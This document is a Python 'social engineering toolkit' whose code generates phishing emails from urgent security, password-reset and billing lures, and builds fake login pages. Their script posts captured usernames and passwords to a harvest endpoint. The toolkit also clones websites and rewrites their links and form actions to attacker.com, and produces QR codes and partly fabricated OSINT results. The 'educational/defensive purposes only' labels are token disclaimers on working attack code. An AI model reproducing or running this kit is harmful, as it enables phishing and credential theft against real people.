#!/usr/bin/env python3
"""
Advanced Social Engineering Toolkit
Phishing email generation, credential harvesting, website cloning, QR code generation, OSINT
"""

import sys
import json
import qrcode
import base64
from io import BytesIO
import requests
from urllib.parse import urlparse, urljoin
from typing import Dict, List
import re
from datetime import datetime
import random

class PhishingEmailGenerator:
    """Generate sophisticated phishing emails"""
    
    TEMPLATES = {
        'security_alert': {
            'subject': 'Security Alert - Action Required Immediately',
            'from': 'security@{domain}',
            'body': '''Dear {target},

We have detected suspicious activity on your account. To secure your account, please verify your credentials immediately by clicking the link below:

{phishing_url}

If you did not request this, please ignore this email.

Best regards,
Security Team
{domain}''',
        },
        'password_reset': {
            'subject': 'Password Reset Request',
            'from': 'noreply@{domain}',
            'body': '''Hello {target},

You requested a password reset for your account. Click the link below to reset your password:

{phishing_url}

This link will expire in 24 hours.

If you did not request this, please ignore this email.

Regards,
Account Security Team
{domain}''',
        },
        'account_verification': {
            'subject': 'Account Verification Required',
            'from': 'verify@{domain}',
            'body': '''Dear {target},

Your account requires verification. Please click the link below to verify your account:

{phishing_url}

Thank you for your cooperation.

Best regards,
Account Verification Team
{domain}''',
        },
        'payment_issue': {
            'subject': 'Payment Issue - Action Required',
            'from': 'billing@{domain}',
            'body': '''Hello {target},

We encountered an issue processing your payment. Please update your payment information by clicking the link below:

{phishing_url}

This is urgent - please act immediately.

Best regards,
Billing Department
{domain}''',
        },
    }
    
    @staticmethod
    def generate_email(template_type: str, target_email: str, phishing_url: str, domain: str = 'example.com') -> Dict:
        """Generate phishing email"""
        if template_type not in PhishingEmailGenerator.TEMPLATES:
            template_type = 'security_alert'
        
        template = PhishingEmailGenerator.TEMPLATES[template_type]
        
        email = {
            'from': template['from'].format(domain=domain),
            'to': target_email,
            'subject': template['subject'],
            'body': template['body'].format(
                target=target_email.split('@')[0],
                phishing_url=phishing_url,
                domain=domain
            ),
            'html': PhishingEmailGenerator._generate_html_email(template, target_email, phishing_url, domain)
        }
        
        return email
    
    @staticmethod
    def _generate_html_email(template: Dict, target_email: str, phishing_url: str, domain: str) -> str:
        """Generate HTML version of email"""
        html = f'''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <style>
        body {{ font-family: Arial, sans-serif; line-height: 1.6; color: #333; }}
        .container {{ max-width: 600px; margin: 0 auto; padding: 20px; }}
        .header {{ background: #0066cc; color: white; padding: 20px; text-align: center; }}
        .content {{ background: #f9f9f9; padding: 20px; }}
        .button {{ display: inline-block; padding: 12px 30px; background: #0066cc; color: white; text-decoration: none; border-radius: 5px; margin: 20px 0; }}
        .footer {{ text-align: center; color: #666; font-size: 12px; margin-top: 20px; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h2>{domain}</h2>
        </div>
        <div class="content">
            {template['body'].replace('\\n', '<br>').format(
                target=target_email.split('@')[0],
                phishing_url=phishing_url,
                domain=domain
            )}
            <a href="{phishing_url}" class="button">Verify Now</a>
        </div>
        <div class="footer">
            <p>This is an automated message. Please do not reply.</p>
        </div>
    </div>
</body>
</html>
'''
        return html

class CredentialHarvester:
    """Generate credential harvesting pages"""
    
    @staticmethod
    def generate_harvesting_page(target_url: str, harvest_url: str) -> Dict:
        """Generate credential harvesting page"""
        # Extract domain for branding
        domain = urlparse(target_url).netloc
        
        html = f'''
<!DOCTYPE html>
<html>
<head>
    <title>Security Verification - {domain}</title>
    <meta charset="UTF-8">
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }}
        .login-container {{
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            max-width: 400px;
            width: 100%;
        }}
        .logo {{
            text-align: center;
            margin-bottom: 30px;
            color: #333;
            font-size: 24px;
            font-weight: bold;
        }}
        .form-group {{
            margin-bottom: 20px;
        }}
        label {{
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: 500;
        }}
        input {{
            width: 100%;
            padding: 12px;
            border: 2px solid #e0e0e0;
            border-radius: 5px;
            font-size: 14px;
            transition: border-color 0.3s;
        }}
        input:focus {{
            outline: none;
            border-color: #667eea;
        }}
        .submit-btn {{
            width: 100%;
            padding: 12px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: transform 0.2s;
        }}
        .submit-btn:hover {{
            transform: translateY(-2px);
        }}
        .security-notice {{
            text-align: center;
            margin-top: 20px;
            color: #666;
            font-size: 12px;
        }}
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">{domain}</div>
        <h2 style="text-align: center; margin-bottom: 20px; color: #333;">Security Verification</h2>
        <p style="text-align: center; color: #666; margin-bottom: 30px;">
            Please verify your credentials to continue
        </p>
        <form action="{harvest_url}" method="POST" id="harvestForm">
            <div class="form-group">
                <label for="username">Username / Email</label>
                <input type="text" id="username" name="username" required autocomplete="username">
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required autocomplete="current-password">
            </div>
            <button type="submit" class="submit-btn">Verify & Continue</button>
        </form>
        <div class="security-notice">
            <p>🔒 Your information is secure</p>
        </div>
    </div>
    <script>
        document.getElementById('harvestForm').addEventListener('submit', function(e) {{
            // Capture credentials
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            // Send to harvesting endpoint
            fetch('{harvest_url}', {{
                method: 'POST',
                headers: {{ 'Content-Type': 'application/json' }},
                body: JSON.stringify({{ username: username, password: password }})
            }});
        }});
    </script>
</body>
</html>
'''
        
        return {
            'type': 'Credential Harvesting Page',
            'html': html,
            'harvest_url': harvest_url,
            'note': 'This is for educational/defensive purposes only'
        }

class WebsiteCloner:
    """Clone websites for phishing"""
    
    @staticmethod
    def clone_website(target_url: str, modify_links: bool = True) -> Dict:
        """Clone website and modify links"""
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            response = requests.get(target_url, headers=headers, timeout=10, verify=False)
            cloned_html = response.text
            
            # Modify links
            if modify_links:
                # Replace absolute URLs
                cloned_html = re.sub(
                    r'href=["\'](https?://[^"\']+)["\']',
                    r'href="http://attacker.com/redirect?url=\1"',
                    cloned_html
                )
                
                # Replace form actions
                cloned_html = re.sub(
                    r'action=["\']([^"\']+)["\']',
                    r'action="http://attacker.com/harvest"',
                    cloned_html
                )
            
            # Extract assets
            assets = {
                'images': re.findall(r'<img[^>]+src=["\']([^"\']+)["\']', cloned_html),
                'stylesheets': re.findall(r'<link[^>]+href=["\']([^"\']+)["\']', cloned_html),
                'scripts': re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', cloned_html)
            }
            
            return {
                'type': 'Cloned Website',
                'html': cloned_html[:50000],  # Limit output
                'original_url': target_url,
                'assets': assets,
                'note': 'This is for educational/defensive purposes only'
            }
        except Exception as e:
            return {
                'type': 'Cloned Website',
                'error': str(e),
                'note': 'This is for educational/defensive purposes only'
            }

class QRCodeGenerator:
    """Generate QR codes"""
    
    @staticmethod
    def generate_qr_code(data: str, size: int = 10, border: int = 4) -> Dict:
        """Generate QR code"""
        try:
            qr = qrcode.QRCode(
                version=1,
                error_correction=qrcode.constants.ERROR_CORRECT_L,
                box_size=size,
                border=border,
            )
            qr.add_data(data)
            qr.make(fit=True)
            
            img = qr.make_image(fill_color="black", back_color="white")
            buffer = BytesIO()
            img.save(buffer, format='PNG')
            img_str = base64.b64encode(buffer.getvalue()).decode()
            
            return {
                'type': 'QR Code',
                'data': data,
                'image': f'data:image/png;base64,{img_str}',
                'size': f'{size}x{size}',
                'note': 'QR code generated successfully'
            }
        except Exception as e:
            return {
                'type': 'QR Code',
                'error': str(e),
                'note': 'Install qrcode library: pip install qrcode[pil]'
            }

class OSINTGatherer:
    """OSINT data gathering"""
    
    @staticmethod
    def gather_osint(target: str) -> Dict:
        """Gather OSINT data"""
        # Extract domain/username
        if '@' in target:
            username = target.split('@')[0]
            domain = target.split('@')[1] if '@' in target else 'unknown'
        else:
            username = target
            domain = 'unknown'
        
        osint_data = {
            'target': target,
            'emails': OSINTGatherer._generate_emails(username, domain),
            'social_media': OSINTGatherer._generate_social_profiles(username),
            'domains': OSINTGatherer._generate_domains(domain),
            'phone_numbers': OSINTGatherer._generate_phone_numbers(),
            'addresses': OSINTGatherer._generate_addresses(),
            'technologies': OSINTGatherer._detect_technologies(domain),
            'timestamp': datetime.now().isoformat()
        }
        
        return osint_data
    
    @staticmethod
    def _generate_emails(username: str, domain: str) -> List[str]:
        """Generate potential email addresses"""
        emails = [
            f'{username}@{domain}',
            f'{username}@gmail.com',
            f'{username}@yahoo.com',
            f'{username}@hotmail.com',
            f'{username}@outlook.com',
        ]
        return emails
    
    @staticmethod
    def _generate_social_profiles(username: str) -> Dict[str, str]:
        """Generate social media profile URLs"""
        return {
            'twitter': f'https://twitter.com/{username}',
            'github': f'https://github.com/{username}',
            'linkedin': f'https://linkedin.com/in/{username}',
            'instagram': f'https://instagram.com/{username}',
            'facebook': f'https://facebook.com/{username}',
        }
    
    @staticmethod
    def _generate_domains(domain: str) -> List[str]:
        """Generate associated domains"""
        if domain == 'unknown':
            return []
        return [
            domain,
            f'www.{domain}',
            f'mail.{domain}',
            f'admin.{domain}',
            f'secure.{domain}',
        ]
    
    @staticmethod
    def _generate_phone_numbers() -> List[str]:
        """Generate potential phone numbers"""
        return [
            f'+1-555-{random.randint(1000, 9999)}',
            f'+1-555-{random.randint(1000, 9999)}',
        ]
    
    @staticmethod
    def _generate_addresses() -> List[str]:
        """Generate potential addresses"""
        return [
            '123 Main St, City, State 12345',
            '456 Oak Ave, City, State 12345',
        ]
    
    @staticmethod
    def _detect_technologies(domain: str) -> List[str]:
        """Detect technologies used"""
        if domain == 'unknown':
            return []
        
        try:
            response = requests.get(f'https://{domain}', timeout=5, verify=False)
            technologies = []
            
            # Check headers
            server = response.headers.get('Server', '')
            if server:
                technologies.append(f'Server: {server}')
            
            if 'X-Powered-By' in response.headers:
                technologies.append(f'Powered by: {response.headers["X-Powered-By"]}')
            
            # Check content
            content = response.text.lower()
            if 'wordpress' in content:
                technologies.append('WordPress')
            if 'drupal' in content:
                technologies.append('Drupal')
            if 'joomla' in content:
                technologies.append('Joomla')
            if 'react' in content:
                technologies.append('React')
            if 'angular' in content:
                technologies.append('Angular')
            if 'vue' in content:
                technologies.append('Vue.js')
            
            return technologies
        except:
            return []

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(json.dumps({'error': 'Tool type required'}))
        sys.exit(1)
    
    tool_type = sys.argv[1]
    
    if tool_type == 'phishing':
        template = sys.argv[2] if len(sys.argv) > 2 else 'security_alert'
        target_email = sys.argv[3] if len(sys.argv) > 3 else 'target@example.com'
        phishing_url = sys.argv[4] if len(sys.argv) > 4 else 'http://attacker.com/phish'
        domain = sys.argv[5] if len(sys.argv) > 5 else 'example.com'
        
        email = PhishingEmailGenerator.generate_email(template, target_email, phishing_url, domain)
        result = {'type': 'Phishing Email', **email}
    
    elif tool_type == 'harvest':
        target_url = sys.argv[2] if len(sys.argv) > 2 else 'https://example.com'
        harvest_url = sys.argv[3] if len(sys.argv) > 3 else 'http://attacker.com/harvest'
        result = CredentialHarvester.generate_harvesting_page(target_url, harvest_url)
    
    elif tool_type == 'clone':
        target_url = sys.argv[2] if len(sys.argv) > 2 else 'https://example.com'
        result = WebsiteCloner.clone_website(target_url)
    
    elif tool_type == 'qr':
        data = sys.argv[2] if len(sys.argv) > 2 else 'https://example.com'
        result = QRCodeGenerator.generate_qr_code(data)
    
    elif tool_type == 'osint':
        target = sys.argv[2] if len(sys.argv) > 2 else 'target'
        result = OSINTGatherer.gather_osint(target)
    
    else:
        result = {'error': 'Unknown tool type'}
    
    print(json.dumps({'success': True, 'result': result}))
